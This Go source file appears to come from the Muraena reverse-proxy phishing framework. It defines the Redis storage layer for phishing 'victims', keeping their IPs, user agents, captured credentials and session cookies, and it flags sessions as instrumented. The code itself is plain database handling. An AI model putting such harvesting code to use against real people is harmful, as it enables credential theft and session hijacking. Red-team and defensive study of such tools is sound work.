package db

import (
	"fmt"

	"github.com/gomodule/redigo/redis"

	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/session"
)

// Victim: 与 Muraena 交互的浏览器
// KEY scheme:
// victim:<ID>
type Victim struct {
	ID                  string `redis:"id"`
	IP                  string `redis:"ip"`
	UA                  string `redis:"ua"`
	FirstSeen           string `redis:"fseen"`
	LastSeen            string `redis:"lseen"`
	RequestCount        int    `redis:"reqCount"`
	CredsCount          int    `redis:"creds_count"`
	CookieJar           string `redis:"cookiejar_id"`
	SessionInstrumented bool   `redis:"session_instrumented"`

	Cookies     []VictimCookie     `redis:"-"`
	Credentials []VictimCredential `redis:"-"`
}

// VictimCredential: a victim has at least one set of credentials
// KEY scheme:
// victim:<ID>:creds:<COUNT>
type VictimCredential struct {
	Key   string `redis:"key"`
	Value string `redis:"val"`
	Time  string `redis:"time"`
}

// VictimCookie: a victim has N cookies associated with its web session
// KEY scheme:
// victim:<ID>:cookiejar:<COOKIE_NAME>
type VictimCookie struct {
	Name     string `redis:"name" json:"name"`
	Value    string `redis:"value" json:"value"`
	Domain   string `redis:"domain" json:"domain"`
	Expires  string `redis:"expires" json:"expirationDate"`
	Path     string `redis:"path" json:"path"`
	HTTPOnly bool   `redis:"httpOnly" json:"httpOnly"`
	Secure   bool   `redis:"secure" json:"secure"`
	SameSite string `redis:"sameSite" json:"sameSite"`
	Session  bool   `redis:"session" json:"session"` // is the cookie a session cookie?
}

// Store saves a Victim in the database
func (v *Victim) Store() error {

	rc := session.RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s", v.ID)
	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(v)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim not saved.", err)
		return err
	}

	// push the Victim.ID
	_, err := rc.Do("RPUSH", "victims", v.ID)
	if err != nil {
		return err
	}

	return nil
}

// Store saves a VictimCredential in the database
func (vc *VictimCredential) Store(victimID string) error {

	rc := session.RedisPool.Get()
	defer rc.Close()

	v, err := GetVictim(victimID)
	if err != nil {
		return err
	}

	// store the credentials
	key := fmt.Sprintf("victim:%s:creds:%d", victimID, v.CredsCount)
	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(vc)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim creds not saved.", err)
		return err
	}

	// increase the credentials count
	// TODO implement this with REDIS HINCRBY
	key = fmt.Sprintf("victim:%s", victimID)
	increment := make(map[string]string)
	increment["creds_count"] = fmt.Sprintf("%d", v.CredsCount+1)

	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(increment)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim creds not saved.", err)
		return err
	}

	return nil
}

// Store saves a Cookie in the database
func (vc *VictimCookie) Store(victimID string) error {

	rc := session.RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s:cookiejar:%s", victimID, vc.Name)

	jarEntry, err := redis.Values(rc.Do("HGETALL", key))
	if err != nil {
		return err
	}

	var vCookie VictimCookie
	err = redis.ScanStruct(jarEntry, &vCookie)
	if err != nil {
		return err
	}

	// check if the cookie is already stored.
	// if it is, just updates its values but do not add an entry to the cookie names list
	if vCookie.Name == "" {
		// store the cookie name only if not present already
		_, err = rc.Do("RPUSH", fmt.Sprintf("victim:%s:cookiejar_entries", victimID), vc.Name)
		if err != nil {
			return err
		}
	}

	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(vc)...); err != nil {
		return err
	}

	return nil
}

// GetVictim 从数据库中返回 Victim
func GetVictim(victimID string) (*Victim, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()

	var v Victim
	vid := fmt.Sprintf("victim:%s", victimID)
	// 获得 vid 对应的 value
	value, err := redis.Values(rc.Do("HGETALL", vid))
	if err != nil {
		return nil, err
	}
	// 将 value 解析为结构体
	err = redis.ScanStruct(value, &v)
	if err != nil {
		return nil, err
	}

	// 填充 Credentials
	err = v.GetCredentials()
	if err != nil {
		return nil, err
	}

	// 填充 Cookies
	err = v.GetVictimCookiejar()
	if err != nil {
		return nil, err
	}

	return &v, nil
}

// GetCredentials 从数据库中返回 VictimCredential
func (v *Victim) GetCredentials() error {
	rc := session.RedisPool.Get()
	defer rc.Close()

	v.Credentials = []VictimCredential{}
	cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:creds:*", v.ID)))
	if err != nil {
		return err
	}

	for _, k := range cKeys {
		creds, err := redis.Values(rc.Do("HGETALL", k))
		if err != nil {
			log.Error("%v", err)
			continue
		}

		var vc VictimCredential
		err = redis.ScanStruct(creds, &vc)
		if err != nil {
			log.Error("%v", err)
			continue
		}

		v.Credentials = append(v.Credentials, vc)
	}

	return nil
}

// GetVictimCookiejar 返回 victim 的 VictimCookie
func (v *Victim) GetVictimCookiejar() error {
	rc := session.RedisPool.Get()
	defer rc.Close()

	v.Cookies = []VictimCookie{}

	cKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:cookiejar:*", v.ID)))
	if err != nil {
		return err
	}

	for _, k := range cKeys {
		cookies, err := redis.Values(rc.Do("HGETALL", k))
		if err != nil {
			log.Error("%v", err)
			continue
		}

		var vc VictimCookie
		err = redis.ScanStruct(cookies, &vc)
		if err != nil {
			log.Error("%v", err)
			continue
		}

		v.Cookies = append(v.Cookies, vc)
	}

	return nil
}

// GetAllVictims 返回数据库中存储的所有 victim 信息
func GetAllVictims() ([]Victim, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()
	// 获取 victims 的 ID 列表
	values, err := redis.Strings(rc.Do("LRANGE", "victims", "0", "-1"))
	if err != nil {
		return nil, err
	}

	// 获取每个 victims 的信息
	var victims []Victim
	for _, vID := range values {
		v, err := GetVictim(vID)
		if err != nil {
			log.Error("error fetching victim %s: %s", vID, err)
			continue
		}

		victims = append(victims, *v)
	}

	return victims, nil
}

func SetSessionAsInstrumented(victimID string) error {
	rc := session.RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s", victimID)
	if _, err := rc.Do("HSET", key, "session_instrumented", true); err != nil {
		log.Error("error doing redis HSET: %s. session_instrumented field not saved.", err)
		return err
	}

	return nil
}
